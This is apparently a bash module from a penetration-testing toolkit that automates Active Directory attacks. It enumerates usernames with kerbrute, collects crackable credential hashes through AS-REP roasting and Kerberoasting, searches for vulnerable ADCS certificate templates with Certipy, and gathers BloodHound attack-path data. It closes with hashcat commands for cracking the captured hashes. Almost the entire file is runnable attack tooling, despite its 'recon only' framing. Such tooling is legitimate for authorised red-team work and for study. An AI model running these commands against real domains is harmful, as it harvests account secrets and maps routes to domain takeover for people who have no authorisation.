#!/usr/bin/env bash
# ==========================================================================
# 06-ad-recon.sh  -  Active Directory recon: AS-REP / Kerberoast collection
#                    and BloodHound graph collection.
#
#  RECON ONLY. This module COLLECTS data (roastable hashes for OFFLINE
#  cracking, directory objects, AD relationships). It never sprays or
#  brute-forces passwords against the domain, so it cannot lock accounts.
#  Crack any captured hashes offline, on your own hardware, out of band.
# ==========================================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./config.sh
source ./lib/common.sh
RUN="${RUN:?RUN not set}"
OUT="$RUN/06-ad-recon"; mkdir -p "$OUT"; LOG="$OUT/ad.log"
DC="$RUN/hosts_dc.txt"
NXC=$(nxc_bin) || NXC=""

phase "Active Directory Recon"
if ! task_listing; then
  [[ -s "$DC" ]] || { warn "No DC identified — AD recon needs a DC. Skipping."; exit 0; }
fi
DC1=""; [[ -s "$DC" ]] && DC1=$(head -1 "$DC"); [[ -n "$DC_IP" ]] && DC1="$DC_IP"

# Username source: kerbrute-validated > harvested (03 RID-brute) > config list.
USERS="$RUN/domain_users.txt"
[[ -s "$USERS" ]] || USERS="$USER_WORDLIST"
[[ -s "$OUT/valid_users.txt" ]] && USERS="$OUT/valid_users.txt"

# ---- Sub-task: username validation via Kerberos pre-auth ------------------
# Sends AS-REQ and reads the KDC error to confirm which names exist. This is
# enumeration only — no passwords are tried, so it cannot lock accounts.
t_kerbrute() {
  { have kerbrute && [[ -s "$USERS" && -n "$DOMAIN" ]]; } \
    || { warn "kerbrute missing, no user list, or no DOMAIN — skipping."; return 0; }
  log "kerbrute userenum (validate usernames; no password attempts)"
  kerbrute userenum --dc "$DC1" -d "$DOMAIN" "$USERS" -o "$OUT/kerbrute_valid.txt" 2>/dev/null || true
  if [[ -s "$OUT/kerbrute_valid.txt" ]]; then
    grep -oiE '[A-Za-z0-9._-]+@'"$DOMAIN" "$OUT/kerbrute_valid.txt" | sed "s/@.*//" \
      | sort -u > "$OUT/valid_users.txt" 2>/dev/null || true
    [[ -s "$OUT/valid_users.txt" ]] && { USERS="$OUT/valid_users.txt"; ok "Validated $(wc -l <"$USERS") usernames -> $USERS"; }
  fi
}

# ---- Sub-task: AS-REP roasting (no creds needed) --------------------------
# Requests AS-REP for accounts that don't require Kerberos pre-auth. This is a
# directory query, not an authentication attempt — it does not touch lockout.
t_asrep() {
  if have GetNPUsers.py || have impacket-GetNPUsers; then
    local GNP; GNP=$(command -v GetNPUsers.py || command -v impacket-GetNPUsers)
    if [[ -s "$USERS" ]]; then
      log "AS-REP roasting (no auth required; offline-crackable hashes)"
      run "$LOG" "$GNP" "${DOMAIN}/" -usersfile "$USERS" -no-pass -dc-ip "$DC1" \
        -outputfile "$OUT/asrep_hashes.txt" 2>/dev/null || true
    else
      warn "No user list for AS-REP roasting — skipping."
    fi
  elif [[ -n "$NXC" && -n "$USERNAME" ]]; then
    run "$LOG" "$NXC" ldap "$DC1" -u "$USERNAME" -p "${PASSWORD:-}" --asreproast "$OUT/asrep.txt" || true
  else
    warn "No GetNPUsers / netexec available — skipping AS-REP roasting."
  fi
}

# ---- Sub-task: Kerberoasting (needs ANY valid read-only domain creds) -----
t_kerberoast() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping Kerberoast (set read-only creds in config.sh)."; return 0; }
  if have GetUserSPNs.py || have impacket-GetUserSPNs; then
    local GSP; GSP=$(command -v GetUserSPNs.py || command -v impacket-GetUserSPNs)
    log "Kerberoasting (requesting TGS for all SPNs; offline-crackable hashes)"
    if [[ -n "$NTHASH" ]]; then
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME" -hashes ":$NTHASH" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    else
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    fi
  else
    warn "GetUserSPNs not available — skipping Kerberoast."
  fi
}

# ---- Sub-task: ADCS enumeration (Certipy) — template misconfigs -----------
# Read-only directory query for vulnerable templates / CA settings (ESC1-ESC8).
t_adcs() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping ADCS enumeration."; return 0; }
  local CERTIPY; CERTIPY=$(command -v certipy || command -v certipy-ad || true)
  if [[ -z "$CERTIPY" ]]; then
    warn "certipy not installed — skipping ADCS enumeration (pipx install certipy-ad)."
    return 0
  fi
  log "ADCS enumeration (certipy find -vulnerable)"
  pushd "$OUT" >/dev/null
  if [[ -n "$NTHASH" ]]; then
    "$CERTIPY" find -u "$USERNAME@$DOMAIN" -hashes ":$NTHASH" -dc-ip "$DC1" \
      -vulnerable -stdout > certipy_adcs.txt 2>&1 || true
  else
    "$CERTIPY" find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC1" \
      -vulnerable -stdout > certipy_adcs.txt 2>&1 || true
  fi
  popd >/dev/null
  if grep -qiE 'ESC[0-9]+|Vulnerab' "$OUT/certipy_adcs.txt" 2>/dev/null; then
    warn "ADCS vulnerable template(s) found -> $OUT/certipy_adcs.txt"
    grep -iE 'ESC[0-9]+|Template Name|Vulnerab' "$OUT/certipy_adcs.txt" | sort -u > "$OUT/adcs_summary.txt" || true
  else
    ok "ADCS enumerated (no vulnerable templates flagged) -> $OUT/certipy_adcs.txt"
  fi
}

# ---- Sub-task: BloodHound collection --------------------------------------
t_bloodhound() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping BloodHound."; return 0; }
  have bloodhound-python || { warn "bloodhound-python not installed — skipping."; return 0; }
  log "BloodHound collection (-c all)"
  mkdir -p "$OUT/bloodhound"; pushd "$OUT/bloodhound" >/dev/null
  if [[ -n "$NTHASH" ]]; then
    bloodhound-python -d "$DOMAIN" -u "$USERNAME" --hashes ":$NTHASH" \
      -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
  else
    bloodhound-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
      -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
  fi
  popd >/dev/null
  ok "BloodHound zip -> $OUT/bloodhound (import into BloodHound GUI)"
}

task kerbrute   "Validate usernames via Kerberos pre-auth (kerbrute)" t_kerbrute
task asrep      "AS-REP roasting (no creds; offline hashes)"          t_asrep
task kerberoast "Kerberoasting (needs read-only domain creds)"        t_kerberoast
task adcs       "ADCS template misconfig enum (Certipy)"              t_adcs
task bloodhound "BloodHound graph collection (-c all)"                t_bloodhound
run_tasks

log "Crack any collected roast hashes OFFLINE (out of band):"
log "  hashcat -m 13100 $OUT/kerberoast_hashes.txt rockyou.txt   # Kerberoast"
log "  hashcat -m 18200 $OUT/asrep_hashes.txt      rockyou.txt   # AS-REP"
ok "AD recon module complete -> $OUT"
